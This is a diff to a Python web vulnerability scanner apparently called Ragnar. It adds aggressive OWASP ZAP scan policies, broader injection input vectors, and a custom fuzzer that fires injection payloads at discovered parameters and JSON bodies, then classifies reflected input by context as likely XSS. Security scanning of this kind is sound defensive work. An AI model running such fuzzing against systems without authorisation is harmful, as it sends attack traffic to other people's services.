             try:
@@ -2759,7 +3174,11 @@ class AdvancedVulnScanner:
                     break
 
                 elapsed = time.time() - start_time
-                progress.progress_percent = 30 + int((elapsed / max_duration) * 20)  # 30-50%
+                # Scale: 20-35% if fuzzer enabled, 30-50% if standard
+                if profile['enable_fuzzer']:
+                    progress.progress_percent = 20 + int((elapsed / max_duration) * 15)
+                else:
+                    progress.progress_percent = 30 + int((elapsed / max_duration) * 20)
                 time.sleep(3)
 
             elapsed_total = int(time.time() - start_time)
@@ -2778,7 +3197,643 @@ class AdvancedVulnScanner:
         except Exception as e:
             self._scan_log(scan_id, 'warning', f"Ajax spider phase error (continuing): {e}")
 
-    def _run_zap_active_scan_phase(self, scan_id: str, target: str, options: Dict, progress: ScanProgress):
+    def _create_zap_scan_policy(self, scan_id: str, options: Dict) -> Optional[str]:
+        """Create a temporary ZAP scan policy for thorough/insane scans.
+        Returns the policy name or None if standard strength."""
+        profile = self._get_strength_profile(options)
+        strength = options.get('scan_strength', 'standard')
+
+        if strength == 'standard':
+            return None
+
+        policy_name = f"ragnar-{strength}-{scan_id[-8:]}"
+
+        try:
+            self._zap_api_call('JSON/ascan/action/addScanPolicy', {
+                'scanPolicyName': policy_name
+            })
+            self._scan_log(scan_id, 'info', f"Created scan policy: {policy_name}")
+        except Exception as e:
+            self._scan_log(scan_id, 'warning', f"Could not create scan policy: {e}")
+            return None
+
+        configured = 0
+        for plugin_id in self.ZAP_INJECTION_SCANNER_IDS:
+            try:
+                self._zap_api_call('JSON/ascan/action/setScannerAttackStrength', {
+                    'id': str(plugin_id),
+                    'attackStrength': profile['attack_strength'],
+                    'scanPolicyName': policy_name,
+                })
+                self._zap_api_call('JSON/ascan/action/setScannerAlertThreshold', {
+                    'id': str(plugin_id),
+                    'alertThreshold': profile['alert_threshold'],
+                    'scanPolicyName': policy_name,
+                })
+                configured += 1
+            except Exception:
+                pass  # Plugin may not exist in this ZAP version
+
+        self._scan_log(scan_id, 'info',
+                       f"Configured {configured}/{len(self.ZAP_INJECTION_SCANNER_IDS)} "
+                       f"scanner plugins for {strength} policy")
+        return policy_name
+
+    def _remove_zap_scan_policy(self, scan_id: str, policy_name: Optional[str]):
+        """Remove a temporary scan policy after scan completes."""
+        if not policy_name:
+            return
+        try:
+            self._zap_api_call('JSON/ascan/action/removeScanPolicy', {
+                'scanPolicyName': policy_name
+            })
+            self._scan_log(scan_id, 'info', f"Removed scan policy: {policy_name}")
+        except Exception as e:
+            self._scan_log(scan_id, 'debug', f"Could not remove scan policy {policy_name}: {e}")
+
+    def _configure_zap_input_vectors(self, scan_id: str, options: Dict):
+        """Configure ZAP input vectors for thorough/insane scans."""
+        strength = options.get('scan_strength', 'standard')
+        if strength == 'standard':
+            return
+
+        profile = self._get_strength_profile(options)
+
+        try:
+            # Injectable parameter types: query=1, POST=2, path=4, headers=8, cookies=16
+            self._zap_api_call('JSON/ascan/action/setOptionTargetParamsInjectable', {
+                'Integer': '31'
+            })
+            # RPC parsing: multipart=1, XML=2, JSON=4, OData=32
+            self._zap_api_call('JSON/ascan/action/setOptionTargetParamsEnabledRPC', {
+                'Integer': '39'
+            })
+            # Scan headers on all requests
+            self._zap_api_call('JSON/ascan/action/setOptionScanHeadersAllRequests', {
+                'Boolean': 'true'
+            })
+            # Handle anti-CSRF tokens automatically
+            self._zap_api_call('JSON/ascan/action/setOptionHandleAntiCSRFTokens', {
+                'Boolean': 'true'
+            })
+            # Thread count per host
+            self._zap_api_call('JSON/ascan/action/setOptionThreadPerHost', {
+                'Integer': str(profile['threads_per_host'])
+            })
+            # For insane: unlimited rule duration
+            if strength == 'insane':
+                try:
+                    self._zap_api_call('JSON/ascan/action/setOptionMaxRuleDurationInMins', {
+                        'Integer': '0'
+                    })
+                except Exception:
+                    pass
+
+            self._scan_log(scan_id, 'info',
+                           f"Configured input vectors: injectable=31, rpc=39, "
+                           f"threads={profile['threads_per_host']}, strength={strength}")
+
+        except Exception as e:
+            self._scan_log(scan_id, 'warning', f"Could not configure input vectors: {e}")
+
+    def _analyze_reflection_context(self, payload: str, response_body: str,
+                                     content_type: str = '') -> Optional[Dict]:
+        """Analyze WHERE a reflected payload appears in the response.
+        Returns dict with context, risk, confidence, cwe_id, description or None."""
+        payload_lower = payload.lower()
+        body_lower = response_body.lower()
+
+        # Check if payload is reflected at all
+        if payload not in response_body and payload_lower not in body_lower:
+            return None
+
+        idx = body_lower.find(payload_lower)
+        if idx < 0:
+            return None
+
+        # Get surrounding context
+        preceding = response_body[max(0, idx - 200):idx].lower()
+        following = response_body[idx:idx + len(payload) + 200].lower()
+
+        is_html = 'html' in content_type.lower() if content_type else True
+        is_json = 'json' in content_type.lower() if content_type else False
+
+        # Check JS context: <script> without closing </script> before reflection
+        if is_html and '<script' in preceding and '</script' not in preceding:
+            return {
+                'context': 'js-context',
+                'risk': 3,
+                'confidence': 3,
+                'cwe_id': 'CWE-79',
+                'description': 'Reflected input in JavaScript context - high XSS risk',
+            }
+
+        # Check HTML attribute context
+        if is_html and re.search(r'=\s*["\'][^"\']*$', preceding):
+            return {
+                'context': 'html-attribute',
+                'risk': 3,
+                'confidence': 2,
+                'cwe_id': 'CWE-79',
+                'description': 'Reflected input in HTML attribute context',
+            }
+
+        # Check for unescaped dangerous HTML tags in the reflected area
+        dangerous_tags = ['<script', '<img', '<svg', '<body', '<iframe',
+                          '<object', '<embed', '<input', '<details', '<video', '<audio']
+        if is_html and any(tag in following for tag in dangerous_tags):
+            return {
+                'context': 'html-body',
+                'risk': 3,
+                'confidence': 3,
+                'cwe_id': 'CWE-79',
+                'description': 'Reflected input rendered as HTML with dangerous tags',
+            }
+
+        # Check for style block context
+        if is_html and '<style' in preceding and '</style' not in preceding:
+            return {
+                'context': 'html-body',
+                'risk': 2,
+                'confidence': 2,
+                'cwe_id': 'CWE-79',
+                'description': 'Reflected input in CSS style context',
+            }
+
+        # JSON context
+        if is_json:
+            return {
+                'context': 'json-context',
+                'risk': 2,
+                'confidence': 1,
+                'cwe_id': 'CWE-116',
+                'description': 'Reflected input in JSON response - improper encoding',
+            }
+
+        # General HTML body reflection
+        if is_html:
+            return {
+                'context': 'html-body',
+                'risk': 2,
+                'confidence': 1,
+                'cwe_id': 'CWE-79',
+                'description': 'Reflected input in HTML response body',
+            }
+
+        # Other/ambiguous
+        return {
+            'context': 'other',
+            'risk': 2,
+            'confidence': 1,
+            'cwe_id': 'CWE-79',
+            'description': 'Reflected input detected in response',
+        }
+
+    def _extract_fuzz_endpoints(self, scan_id: str, target: str) -> List[Dict]:
+        """Extract parameterized endpoints from ZAP message history."""
+        parsed_target = urllib.parse.urlparse(target)
+        target_host = parsed_target.netloc
+        endpoints = []
+        seen_keys = set()
+
+        try:
+            messages = self._zap_api_call('JSON/core/view/messages', {
+                'baseurl': target,
+                'start': '0',
+                'count': '500'
+            })
+            msg_list = messages.get('messages', [])
+
+            for msg in msg_list:
+                req_header = msg.get('requestHeader', '')
+                req_body = msg.get('requestBody', '')
+                if not req_header:
+                    continue
+
+                first_line = req_header.split('\n')[0] if '\n' in req_header else req_header
+                parts = first_line.split(' ')
+                if len(parts) < 2:
+                    continue
+
+                method = parts[0].upper()
+                req_path = parts[1]
+
+                # Build full URL from request path
+                if req_path.startswith('http'):
+                    full_url = req_path
+                else:
+                    full_url = f"{parsed_target.scheme}://{target_host}{req_path}"
+
+                parsed_url = urllib.parse.urlparse(full_url)
+
+                # Check host matches
+                if parsed_url.hostname != parsed_target.hostname:
+                    continue
+
+                params = {}
+                if parsed_url.query:
+                    params = dict(urllib.parse.parse_qsl(parsed_url.query))
+
+                body_dict = None
+                if req_body and method in ('POST', 'PUT', 'PATCH'):
+                    try:
+                        body_dict = json.loads(req_body)
+                        if not isinstance(body_dict, dict):
+                            body_dict = None
+                    except (json.JSONDecodeError, ValueError):
+                        pass
+
+                # Dedup by method:path:params
+                dedup_key = f"{method}:{parsed_url.path}:{sorted(params.keys()) if params else ''}"
+                if dedup_key in seen_keys:
+                    continue
+                seen_keys.add(dedup_key)
+
+                if params or body_dict:
+                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+                    endpoints.append({
+                        'url': base_url,
+                        'params': params,
+                        'method': method,
+                        'body': body_dict,
+                    })
+
+        except Exception as e:
+            self._scan_log(scan_id, 'warning', f"Error extracting fuzz endpoints: {e}")
+
+        return endpoints
+
+    def _generate_synthetic_fuzz_targets(self, endpoints: List[Dict], target: str) -> List[Dict]:
+        """Generate synthetic fuzz targets by appending common params to clean paths."""
+        parsed = urllib.parse.urlparse(target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Collect unique clean paths from existing endpoints
+        clean_paths = set()
+        for ep in endpoints:
+            ep_parsed = urllib.parse.urlparse(ep['url'])
+            clean_paths.add(ep_parsed.path)
+
+        # Also add the target path itself
+        if parsed.path and parsed.path != '/':
+            clean_paths.add(parsed.path)
+        clean_paths.add('/')
+
+        synthetic = []
+        for path in list(clean_paths)[:20]:
+            params = {p: 'test' for p in self.FUZZ_SYNTHETIC_PARAMS[:6]}
+            synthetic.append({
+                'url': f"{base}{path}",
+                'params': params,
+                'method': 'GET',
+                'body': None,
+            })
+
+        return synthetic
+
+    def _fuzz_json_body(self, scan_id: str, url: str, body_dict: Dict,
+                        payload: str, method: str, auth_headers: Dict):
+        """Fuzz JSON body keys by replacing each value with the payload."""
+        parsed = urllib.parse.urlparse(url)
+        host = parsed.netloc
+        path = parsed.path or '/'
+
+        for key in list(body_dict.keys())[:10]:
+            fuzz_body = dict(body_dict)
+            fuzz_body[key] = payload
+            body_bytes = json.dumps(fuzz_body).encode('utf-8')
+
+            request_lines = [
+                f"{method} {path} HTTP/1.1",
+                f"Host: {host}",
+                "Content-Type: application/json",
+                f"Content-Length: {len(body_bytes)}",
+            ]
+            for h_name, h_value in auth_headers.items():
+                request_lines.append(f"{h_name}: {h_value}")
+            request_lines.append('')
+            request_lines.append(body_bytes.decode('utf-8'))
+
+            raw_request = '\r\n'.join(request_lines)
+            try:
+                self._zap_api_call('JSON/core/action/sendRequest', {
+                    'request': raw_request,
+                    'followRedirects': 'true'
+                })
+            except Exception:
+                pass
+
+    def _verify_fuzz_reflections(self, scan_id: str, target: str,
+                                 payloads_used: List[Tuple[str, str]]) -> List[VulnerabilityFinding]:
+        """Bulk-verify reflections by fetching recent ZAP messages."""
+        parsed_target = urllib.parse.urlparse(target)
+        target_host = parsed_target.netloc
+        findings = []
+
+        try:
+            messages = self._zap_api_call('JSON/core/view/messages', {
+                'baseurl': target,
+                'start': '0',
+                'count': '500'
+            })
+            msg_list = messages.get('messages', [])
+        except Exception as e:
+            self._scan_log(scan_id, 'warning', f"Error fetching messages for reflection check: {e}")
+            return findings
+
+        # Build a set of payloads to search for
+        payload_set = [(p, cat) for p, cat in payloads_used]
+        seen_reflections = set()
+
+        for msg in msg_list:
+            resp_body = msg.get('responseBody', '')
+            resp_header = msg.get('responseHeader', '')
+            req_header = msg.get('requestHeader', '')
+            if not resp_body or len(resp_body) < 10:
+                continue
+
+            content_type = ''
+            for line in resp_header.split('\n'):
+                if line.lower().startswith('content-type:'):
+                    content_type = line.split(':', 1)[1].strip()
+                    break
+
+            # Extract request URL and method
+            req_url = ''
+            req_method = 'GET'
+            if req_header:
+                first_line = req_header.split('\n')[0]
+                parts = first_line.split(' ')
+                if len(parts) >= 2:
+                    req_method = parts[0]
+                    req_url = parts[1]
+
+            for payload, category in payload_set:
+                ctx = self._analyze_reflection_context(payload, resp_body, content_type)
+                if not ctx:
+                    continue
+
+                # Dedup
+                dedup_key = f"{req_url}:{payload[:30]}:{ctx['context']}"
+                if dedup_key in seen_reflections:
+                    continue
+                seen_reflections.add(dedup_key)
+
+                risk_map = {1: VulnSeverity.LOW, 2: VulnSeverity.MEDIUM, 3: VulnSeverity.HIGH}
+                severity = risk_map.get(ctx['risk'], VulnSeverity.MEDIUM)
+
+                finding = VulnerabilityFinding(
+                    finding_id=f"{scan_id}-ragnar-fuzz-{len(findings):04d}",
+                    scanner='ragnar-fuzz',
+                    host=target_host,
+                    port=parsed_target.port,
+                    severity=severity,
+                    title=f"Reflected Input - {ctx['context']}",
+                    description=ctx['description'],
+                    cwe_ids=[ctx['cwe_id']],
+                    tags=['ragnar-fuzz', ctx['context'], category],
+                    matched_at=req_url or target,
+                    evidence=f"Payload: {payload[:100]} | Context: {ctx['context']}",
+                    details={
+                        'context': ctx['context'],
+                        'payload': payload[:200],
+                        'category': category,
+                        'method': req_method,
+                        'confidence': ctx['confidence'],
+                    }
+                )
+                findings.append(finding)
+
+                if len(findings) >= 100:
+                    break
+            if len(findings) >= 100:
+                break
+
+        return findings
+
+    def _run_zap_parameter_fuzz_phase(self, scan_id: str, target: str,
+                                      options: Dict, progress: ScanProgress):
+        """Ragnar-Fuzz: fire-then-verify custom parameter fuzzing.
+
+        1. Extract parameterized endpoints from ZAP message history
+        2. Generate synthetic fuzz targets from clean paths
+        3. Fire all payloads rapidly via accessUrl/sendRequest
+        4. Bulk-fetch messages and verify reflections
+        """
+        profile = self._get_strength_profile(options)
+        max_payloads = profile['payloads_per_param']
+
+        if max_payloads <= 0:
+            return
+
+        auth_headers = self._build_fuzz_auth_headers(options)
+
+        try:
+            # 1. Extract endpoints from ZAP message history
+            endpoints = self._extract_fuzz_endpoints(scan_id, target)
+            self._scan_log(scan_id, 'info',
+                           f"ragnar-fuzz: Found {len(endpoints)} parameterized endpoints")
+
+            # 2. Generate synthetic targets
+            synthetic = self._generate_synthetic_fuzz_targets(endpoints, target)
+            all_targets = endpoints + synthetic
+            self._scan_log(scan_id, 'info',
+                           f"ragnar-fuzz: {len(all_targets)} total fuzz targets "
+                           f"({len(synthetic)} synthetic)")
+
+            # 3. Build flat payload list limited by max_payloads
+            all_payloads = []
+            for category, payloads in self.RAGNAR_FUZZ_PAYLOADS.items():
+                all_payloads.extend([(p, category) for p in payloads])
+
+            # Limit total payloads per parameter
+            per_param_payloads = all_payloads[:max_payloads]
+
+            # 4. Fire payloads
+            fired_count = 0
+            max_targets = min(len(all_targets), 30 if max_payloads <= 20 else 60)
+
+            for i, endpoint in enumerate(all_targets[:max_targets]):
+                url = endpoint.get('url', '')
+                params = endpoint.get('params', {})
+                method = endpoint.get('method', 'GET')
+                body = endpoint.get('body')
+
+                progress.current_check = (
+                    f"ragnar-fuzz: Fuzzing endpoint {i + 1}/{max_targets}..."
+                )
+                progress.progress_percent = 70 + int((i / max(max_targets, 1)) * 10)
+
+                # Fire payloads for GET query parameters
+                if method == 'GET' and params:
+                    for param_name in list(params.keys())[:5]:
+                        for payload, category in per_param_payloads:
+                            try:
+                                fuzz_params = dict(params)
+                                fuzz_params[param_name] = payload
+                                fuzz_url = (url + '?' +
+                                            urllib.parse.urlencode(fuzz_params, safe=''))
+                                self._zap_api_call('JSON/core/action/accessUrl', {
+                                    'url': fuzz_url,
+                                    'followRedirects': 'false'
+                                })
+                                fired_count += 1
+                            except Exception:
+                                pass
+                            if fired_count % 10 == 0:
+                                time.sleep(0.05)
+
+                # Fire payloads for JSON body
+                if method in ('POST', 'PUT', 'PATCH') and body:
+                    for payload, category in per_param_payloads[:max_payloads // 2]:
+                        try:
+                            self._fuzz_json_body(scan_id, url, body,
+                                                 payload, method, auth_headers)
+                            fired_count += 1
+                        except Exception:
+                            pass
+                        if fired_count % 10 == 0:
+                            time.sleep(0.05)
+
+            self._scan_log(scan_id, 'info', f"ragnar-fuzz: Fired {fired_count} payloads")
+
+            # 5. Bulk verify reflections
+            progress.current_check = "ragnar-fuzz: Verifying reflections..."
+            progress.progress_percent = 82
+            reflection_findings = self._verify_fuzz_reflections(
+                scan_id, target, per_param_payloads)
+
+            self._scan_log(scan_id, 'info',
+                           f"ragnar-fuzz: Found {len(reflection_findings)} reflected payloads")
+
+            for finding in reflection_findings:
+                self.scan_results[scan_id].append(finding)
+
+        except Exception as e:
+            self._scan_log(scan_id, 'warning',
+                           f"ragnar-fuzz phase error (continuing): {e}")
+
+    def _detect_json_reflections(self, scan_id: str, target: str,
+                                 options: Dict, progress: ScanProgress):
+        """Scan ZAP message history for reflected input in JSON responses."""
+        parsed_target = urllib.parse.urlparse(target)
+        target_host = parsed_target.netloc
+        trivial_values = {
+            'true', 'false', 'null', '', '0', '1', 'undefined',
+            'none', 'get', 'post', 'ok', 'yes', 'no', 'error',
+            'success', 'asc', 'desc',
+        }
+
+        try:
+            messages = self._zap_api_call('JSON/core/view/messages', {
+                'baseurl': target,
+                'start': '0',
+                'count': '500'
+            })
+            msg_list = messages.get('messages', [])
+            reflection_count = 0
+            seen_keys = set()
+
+            for msg in msg_list:
+                resp_header = msg.get('responseHeader', '')
+                resp_body = msg.get('responseBody', '')
+                req_header = msg.get('requestHeader', '')
+                req_body = msg.get('requestBody', '')
+
+                # Only check JSON responses
+                if 'application/json' not in resp_header.lower():
+                    continue
+                if not resp_body or len(resp_body) < 10:
+                    continue
+
+                # Extract request URL
+                req_url = ''
+                req_method = 'GET'
+                if req_header:
+                    first_line = req_header.split('\n')[0]
+                    parts = first_line.split(' ')
+                    if len(parts) >= 2:
+                        req_method = parts[0]
+                        req_url = parts[1]
+
+                # Extract parameter values to check for reflection
+                values_to_check = {}  # value -> param_name
+
+                # From query string
+                if '?' in req_url:
+                    query = req_url.split('?', 1)[1]
+                    for k, v_list in urllib.parse.parse_qs(query).items():
+                        for val in v_list:
+                            if val.lower() not in trivial_values and len(val) > 2:
+                                values_to_check[val] = k
+
+                # From JSON request body
+                if req_body:
+                    try:
+                        body_json = json.loads(req_body)
+                        if isinstance(body_json, dict):
+                            for k, v in body_json.items():
+                                if (isinstance(v, str)
+                                        and v.lower() not in trivial_values
+                                        and len(v) > 2):
+                                    values_to_check[v] = k
+                    except (json.JSONDecodeError, ValueError):
+                        pass
+
+                # Check reflections
+                for val, param_name in values_to_check.items():
+                    if val not in resp_body:
+                        continue
+
+                    # Dedup by path + param
+                    parsed_req = urllib.parse.urlparse(req_url)
+                    dedup_key = f"{parsed_req.path}||{param_name}"
+                    if dedup_key in seen_keys:
+                        continue
+                    seen_keys.add(dedup_key)
+
+                    reflection_count += 1
+                    finding = VulnerabilityFinding(
+                        finding_id=f"{scan_id}-ragnar-jsonreflect-{reflection_count:04d}",
+                        scanner='ragnar-fuzz',
+                        host=target_host,
+                        port=parsed_target.port,
+                        severity=VulnSeverity.LOW,
+                        title='Reflected Input in JSON API Response',
+                        description=(
+                            f"Parameter '{param_name}' value '{val[:50]}' is reflected "
+                            f"in the JSON response. This may indicate insufficient "
+                            f"output encoding in the API."
+                        ),
+                        cwe_ids=['CWE-116'],
+                        tags=['ragnar-fuzz', 'json-reflection', 'api'],
+                        matched_at=req_url or target,
+                        evidence=f"Reflected value: {val[:100]}",
+                        details={
+                            'reflected_value': val[:200],
+                            'param_name': param_name,
+                            'method': req_method,
+                            'response_content_type': 'application/json',
+                        }
+                    )
+                    self.scan_results[scan_id].append(finding)
+
+                    if reflection_count >= 50:
+                        break
+                if reflection_count >= 50:
+                    break
+
+            progress.progress_percent = 92
+            self._scan_log(scan_id, 'info',
+                           f"JSON reflection scan: checked {len(msg_list)} messages, "
+                           f"found {reflection_count} reflections")
+
+        except Exception as e:
+            self._scan_log(scan_id, 'warning',
+                           f"JSON reflection detection error: {e}")
+
+    def _run_zap_active_scan_phase(self, scan_id: str, target: str, options: Dict,
+                                   progress: ScanProgress, policy_name: str = None):
         """Active scan phase of full scan"""
         ascan_params = {
             'url': target,
@@ -2794,6 +3849,9 @@ class AdvancedVulnScanner:
             context_id = self._get_zap_context_id('default')
             if context_id:
                 ascan_params['contextId'] = context_id
+        # Use custom scan policy if provided (thorough/insane)
+        if policy_name:
+            ascan_params['scanPolicyName'] = policy_name
         scan_resp = self._zap_api_call('JSON/ascan/action/scan', ascan_params)
         ascan_id = scan_resp.get('scan')
 
@@ -2804,8 +3862,9 @@ class AdvancedVulnScanner:
         self._scan_log(scan_id, 'info', f"Active scan started with ID: {ascan_id}")
 
         # Active scan with timeout and stall detection
+        profile = self._get_strength_profile(options)
         scan_start = time.time()
-        scan_timeout = 1800  # 30 minutes max for active scan phase
+        scan_timeout = profile['active_scan_timeout']
         last_progress = -1
         stall_count = 0
 
@@ -2813,8 +3872,13 @@ class AdvancedVulnScanner:
             try:
                 status_resp = self._zap_api_call('JSON/ascan/view/status', {'scanId': ascan_id})
                 scan_progress = int(status_resp.get('status', 0))
-                progress.progress_percent = 50 + int(scan_progress * 0.5)  # 50-100%
-                progress.current_check = f"Phase 3/3: Active scanning... {scan_progress}%"
+                # Scale progress: 35-70% if fuzzer enabled, 50-100% if standard
+                if profile['enable_fuzzer']:
+                    progress.progress_percent = 35 + int(scan_progress * 0.35)  # 35-70%
+                else:
+                    progress.progress_percent = 50 + int(scan_progress * 0.5)  # 50-100%
+                total_phases = 5 if profile['enable_fuzzer'] else 3
+                progress.current_check = f"Phase 3/{total_phases}: Active scanning... {scan_progress}%"
 
                 # Update findings count filtered by target host
                 try:
@@ -2829,7 +3893,7 @@ class AdvancedVulnScanner:
                 # Check for stalled scan (some vuln checks like timing-based SQLi take time)
                 if scan_progress == last_progress:
                     stall_count += 1
-                    if stall_count >= 24:  # 120 seconds of no progress
+                    if stall_count >= profile['stall_threshold']:
                         self._scan_log(scan_id, 'warning', f"Active scan phase stalled at {scan_progress}% for 2 minutes, stopping...")
                         break
                 else:
